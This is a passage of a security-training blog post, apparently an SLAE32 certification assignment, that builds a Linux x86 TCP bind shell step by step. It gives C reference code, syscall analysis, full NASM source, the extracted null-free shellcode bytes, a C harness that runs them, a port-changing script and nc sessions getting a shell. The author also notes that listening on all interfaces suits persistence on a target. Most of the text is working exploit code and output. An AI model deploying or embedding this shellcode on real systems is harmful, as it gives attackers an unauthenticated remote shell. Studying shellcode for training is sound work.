NULL, NULL); // 5) Dup2() Syscall dup2(acceptfd, 0); // stdin dup2(acceptfd, 1); // stdout dup2(acceptfd, 2); // stderr // 6) Execve() Syscall execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); return 0; } Testing the code to see how it behaves.\nCompiling with gcc\n$ gcc bind.c -o bind\nExecuting bind and using nc to perform a connection to port 9001 in localhost\nThe C bind shell works as expected. From this, we have a reference to build our shellcode.\nChecking which syscalls are used In total, there are six syscalls enumerated below:\nsocket - 359 - 0x167 bind - 361 - 0x169 listen - 363 - 0x16b accept4 - 364 - 0x16c dup2 - 63 - 0x3f execve - 11 - 0xb We can use the file /usr/include/x86_64-linux-gnu/asm/unistd_32 to check the definition of each syscall.\nLet\u0026rsquo;s dive into each syscall and analyze why they are used and how we can define them in intel x86 ISA.\n1 - Socket syscall (0x167) // 1) Socket Creation sockfd = socket(AF_INET, SOCK_STREAM, 0); The socket syscall has 3 parameters\ndomain - The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.\nIn this case, we are interested in the AF_INET flag which purpose is for IPv4 communication.\nSearching on the internet for where Socket is defined in the Linux environment, I found this Stackoverflow question.\nAfter checking each one, the file /usr/include/x86_64-linux-gnu/bits/socket.h has the value we are looking for\nWe can use the find command this purpose too.\nThe domain value (PF_INET) = 2\nType - specifies the communication semantics\nThe type is SOCK_STREAM = 1\nprotocol - The protocol specifies a particular protocol to be used with the socket.\nAccording to the man page page \u0026ldquo;Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0\u0026rdquo;\nSo, protocol = 0\nTranslating to assembly:\neax = 0x167 ebx = 0x2 ecx = 0x1 edx = 0 2 - Bind Syscall (0x169) For this syscall the C code has the following structure:\nStruct sockaddr_in // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; Bind Syscall int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Bind() Syscall bind(sockfd, (struct sockaddr *) \u0026amp;addr, sizeof(addr)); With the following arguments:\nint sockfd - sockfd is the socket descriptor returned by socket() in eax. const struct sockaddr *addr - pointer to struct sockaddr that contains information about your IP address and por socklen_t addrlen - addrlen specifies the size, in bytes, of the address structure pointed to by addr. In other words, addrlen is set to sizeof(struct sockaddr). int sockfd\nFirst, as we have the socket file descriptor in eax, we can put it directly in ebx, the first argument. \u0026ndash;\u0026gt; mov ebx, eax\nconst struct sockaddr *addr\nAt first, defining the sockaddr struct appears to be complex, but after some research on how to do it properly, turns out simple. We can define the struct using what I call the \u0026ldquo;Struct Stack Technique\u0026rdquo; - an adaption of the execve shellcode stack technique or jmp-call-pop technique.\nWe need to pass a pointer to the address of the struct. Using this technique, esp will give the address to ecx.\nLet\u0026rsquo;s start creating our sockaddr to the stack. According to the sockets programming tutorial and the C code shown above, this struct is defined by the following parameters:\nIn pratical terms:\nAF_INET - 0x2 Port Number - 9001 (0x2329) Internet Address - 0.0.0.0 (all IPv4 address in the local machine) -\u0026gt; meaning we can establish a connection from any interface. Very good for persistence purposes 0 sockeln_t addrlen\nThe value can be obtained from /usr/include/linux/in.h file (#define \\__SOCK_SIZE__ 16).\nTo be more specific, the bind syscall manual page hints about the size. We know that is the size of the sockaddr struct. The man page has a specification on how this struct is organized.\nFrom there, sa_data is defined as a char array of 14 used to determine the protocol address. A char is 1 byte in size, so the array has 14 bytes.\nBut what is sa_family_t type?\nLooking sockets programming tutorial (page 3) says it is an unsigned short and it refers to the AF_XXX address family. An unsigned short is equal to 2 bytes.\nSearching where this type is defined in the filesystem it appeared this StackOverflow page points to this doc related to the sys/socket.h.\nSearching in the filesystem, we confirm the sa_family_t is defined as an unsigned short type. The doc also specifies it as an unsigned int (2 bytes). See the C data types page.\nDoing the math, 2 bytes + 14 bytes = 16 bytes. That\u0026rsquo;s the confirmation for the sockaddr struct size.\n3 - Listen syscall (0x16b) It only requires 2 parameters. The socket field descriptor we created before and the backlog is the number of connections allowed on the incoming queue. As we want our connection to be immediate, we put the value 0.\n// 3) Listen() Syscall listen(sockfd, 0); 4 - Accept4 syscall (0x16b) Simple syscall with four parameters. Returns a nonnegative integer that is a file descriptor for the accepted socket to eax register.\nThe man page states that addr can be NULL. As consequence, addrlen must be NULL too. Also, mentions If flags are 0, then accept4() is the same as accept().\nWe just need to null esi as according to the calling conventions \u0026ndash;\u0026gt; xor esi, esi\nWe already have sockfd and the rest are null. Pretty easy to set up.\n// 4) Accept() Syscall acceptfd = accept(sockfd, NULL, NULL); // 5) Dup2() Syscall 5 - Dup2 syscall (0x3f) Anyone familiar with OS stuff knows the use of the dup family syscalls.\nThis duplicates stdinput, stdout, and stderr to the created TCP connection file descriptor. Doing this redirects the input and output of the established connection.\n// 5) Dup2() Syscall dup2(acceptfd, 0); // stdin dup2(acceptfd, 1); // stdout dup2(acceptfd, 2); // stderr 6 - Execve syscall (0xb) Everything is set up now, and we need to tell the program to execute /bin/sh. The execve takes three arguments, but in this case, we need to fill the first argument to achieve our purposes.\n// 6) Execve() Syscall execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); \u0026ldquo;Assembling\u0026rdquo; our shellcode Translating the above concepts to assembly follows the same steps. We must carefully prepare and clean the registers according to each syscall, especially eax.\nAs eax stores the return data from a syscall, its content is always written, and sometimes we need to save eax’s content before calling a syscall.\nxor eax, eax ; zeroes eax cdq ; zeroes edx (trick to use less space) After this, it’s time to set up the syscall arguments having the C code as a reference.\n; socket syscall mov ax, 0x167 ; syscall socket() - 359 push byte 0x02 ; push and pop byte to save space (another trick) pop ebx ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h push byte 0x01 pop ecx ; setting up SOCK_STREAM = 1 ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax EAX contains 0x167, which is sys_socket as seen in /usr/include/i386-linux-gnu/asm/unistd_32.h, then EBX is set to 0x2 (PF_INET).\nNext, the value 0x01 is moved into ECX, which is the value of SOCK_STREAM. EDX is already zero because of the previous cdq instruction.\nI just left to use the interruption syscall int 0x80 to create the socket.\nIf executed successfully, we have our socket. The next step is to set up the bind syscall.\nBeforehand, let\u0026rsquo;s prepare the next syscall.\nmov ebx, eax ; moves socket address to ebx (first arg of bind syscall - sockfd) xor eax, eax Then , the sockaddr_in struct is created as follows:\npush edx\t; edx remains zero ;sockaddr struct\tpush edx\t; edx is still zero -\u0026gt; 0.0.0.0 - bind shell listens in all interfaces push word 0x2923 ; little endian -\u0026gt; 9001 = 0x2329 push word 0x2 ; AF_INET mov ecx, esp ; Putting the struct pointer in ECX The struct is finally defined. The trickiest part to understand, I must say.\nEDX is still zero, so pushing zeroes will effectively result in push the IP address 0.0.0.0. This address makes the program listen in all interfaces. This is a clever way if our purpose is to have persistence in a target machine.\nThe next step is to load the stack with the port number. As Intel works with the little-endian format, we push 0x2923 which is the value 9001. Lastly, pushing 0x2 refers to AF_INET.\nNow, it is just a matter of putting 0x10 (16 bytes) to EDX, which represents the size of sockaddr_in struct as mentioned in the previous section, and executing the bind syscall with 0x169 in EAX.\nmov dl, 0x10 mov ax, 0x169 int 0x80 The following syscalls are listen and accept4 which work similarly to the above functions.\nFor the accept4, we already have sockfd in EBX, and we need to clear the other arguments.\nFor dup2, we use a loop to use fewer instructions to save space while constructing a fully interactive bind shell.\n; accept4 syscall ; ebx already has sockfd xor eax, eax cdq xor ecx, ecx xor esi, esi mov ax, 0x16c int 0x80 ;xor edi, edi mov edx, eax ; edx is already zero ; dup2 syscall mov cl, 0x03 dup2: ;xor eax, eax ;mov al, 0x3f push byte 0x3f pop eax mov ebx, edx dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 We reach the final stage, using execve syscall to execute /bin/sh and spawn a shell when a connection is made to the bind port. If all works as expected, a system shell will be provided to the incoming connection, which can interact with the target machine.\n; execve cdq\t; edx needs to be zero push ecx\t; ecx is zero because jnz and we avoid null bytes push 0x68732f2f ; /bin//ls push 0x6e69622f mov ebx, esp push byte 0xb ; execve syscall pop eax int 0x80 There is an essential step in the above code that we must be aware of, how we place the string /bin/sh in the stack.\npush ecx\t; ecx is zero because jnz and we avoid null bytes push 0x68732f2f ; \u0026#34;sl//\u0026#34; push 0x6e69622f ; \u0026#34;nib/\u0026#34; mov ebx, esp The stack grows from high to low addresses, so we need to place /bin/sh and null-terminated in reverse order. Besides that, one of the most important details we know is memory alignment. This highly influences CPU performance, and because of this, it will attempt to maximize the memory use as efficiently as possible.\nThe way it does in a 32-bit ISA is to work with multiples of 4 bytes in the memory address space. So, we need to make our string divisible by 4.\nBut /bin/sh is a 7-byte string. How do we make it divisible by 4?\nThere are various ways, but what we can do is “abuse” the slashes. Using / or // is the same in the Linux environment. Using this knowledge, we can use the string /bin//sh to fulfill memory alignment requirements.\nAs an extra challenge, I leverage this task to develop a script called The x86 \u0026quot;Little-Hexdian\u0026quot; String Convert, which checks if a string passed as an argument is aligned and converts it to hexadecimal in little-endian format.\nHere\u0026rsquo;s a screenshot of the script output.\nAvailable in https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py\nFinal Assembly Code ; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 1 : TCP Bind Shell (Linux/x86) Assembly ; File Name : bind_shell.nasm global\t_start section\t.text _start: xor eax, eax cdq ; socket syscall mov ax, 0x167 ;xor ebx, ebx ;mov bl, 0x02 push byte 0x02 pop ebx ;xor ecx, ecx ;mov cl, 0x01 push byte 0x01 pop ecx ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax ; bind syscall mov ebx, eax ; moves socket address to ebx (first arg - sockfd) xor eax, eax push edx\t; edx remains zero ; sockaddr struct\tpush edx\t; 0.0.0.0 push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 push word 0x2 mov ecx, esp mov dl, 0x10 mov ax, 0x169 int 0x80 ; listen syscall xor eax, eax xor ecx, ecx ; ebx already has sockfd mov ax, 0x16b ;add ax, 0x2 int 0x80 ; accept4 syscall ; ebx already has sockfd xor eax, eax cdq xor ecx, ecx xor esi, esi mov ax, 0x16c int 0x80 ;xor edi, edi mov edx, eax ; edx is already zero ; dup2 mov cl, 0x03 dup2: push byte 0x3f pop eax mov ebx, edx dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 ; execve cdq\t; edx needs to be zero ;push eax push ecx\t; ecx is zero because jnz push 0x68732f2f push 0x6e69622f mov ebx, esp ;xor eax, eax ;mov al, 0xb push byte 0xb pop eax int 0x80\tCompiling and Testing the Shellcode To be easier to compile my shellcode scripts and get the size and the opcodes, I developed a shell script named assembler.sh\nAvailable in https://github.com/0xnibbles/slae_x86/blob/main/assembler.sh\nChecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ls bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o biShell.sh original_bind_shell.nasm syscalls ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ../../assembler.sh bind_shell.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 95 \u0026#34;\\x31\\xc0\\x99\\x66\\xb8\\x67\\x01\\x6a\\x02\\x5b\\x6a\\x01\\x59\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x52\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x99\\x31\\xc9\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x89\\xc2\\xb1\\x03\\x6a\\x3f\\x58\\x89\\xd3\\xfe\\xc9\\xcd\\x80\\x75\\xf5\\x99\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x6a\\x0b\\x58\\xcd\\x80\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x31\\xc0\\x99\\x66\\xb8\\x67\\x01\\x6a\\x02\\x5b\\x6a\\x01\\x59\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x52\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x99\\x31\\xc9\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x89\\xc2\\xb1\\x03\\x6a\\x3f\\x58\\x89\\xd3\\xfe\\xc9\\xcd\\x80\\x75\\xf5\\x99\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x6a\\x0b\\x58\\xcd\\x80\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ ./bind_shell Shellcode Length: 95 No errors and our bind shell is awaiting for a connection. Let\u0026rsquo;s use nc to perform that.\n╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -nv 127.0.0.1 9001 (UNKNOWN) [127.0.0.1] 9001 (?) open ls biShell.sh bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o original_bind_shell.nasm shellcode.c syscalls id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) Fantastic! The TCP Bind Shell works as expected and was successfully injected into a working program.\nWhat if we want to change the bind port? One of the requirements for this assignment is the ability to change the bind port used in the shellcode easily. For that, we can change the bytes in the shellcode related to the port and change them for the specific port we want the bind shell waits for a connection.\nThe following shell script is named biShell.sh replaces the hardcoded 9001 with the port provided by the user as an argument. It automatically converts the port into the hexadecimal little-endian format.\nAvailable at https://github.com/0xnibbles/slae_x86/blob/main/assignments/1-Shell_Bind_TCP/biShell.sh\nIt accepts one argument - the desired bind port.\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ ./biShell.sh 9999 [*] Doing magic with your port number [*] Done Enjoy this Bind TCP Shellcode with the port 9999 \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x52\\x66\\x68\\x27\\x0F\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x99\\x31\\xc9\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#34; [*] Port converted in hex Little-Endian: 270F -------------------- [*] Hack the World! -------------------- Compiling using our shellcode tester and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o bind_shell9999 shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ ./bind_shell9999 Shellcode Length: 101 Trying to establish a connection to port 9999\n╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -nv 127.0.0.1 9999 (UNKNOWN) [127.0.0.1] 9999 (?) open ls biShell.sh bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o bind_shell9999 original_bind_shell.nasm shellcode.c syscalls id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nNow at: https://www.pentesteracademy.com/course?id=3 Student ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae32/slae_32_assignment_1/","summary":"This post introduces the first mission of my SLAE32 journey.\nIntroduction The main goal for the first SLAE32 assignment is to develop a bind TCP shellcode with the following requirements:\nBinds to a port; Executing a shell on incoming connection; The shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user.","title":"SLAE32 Assignment 1 - TCP Bind Shellcode"}]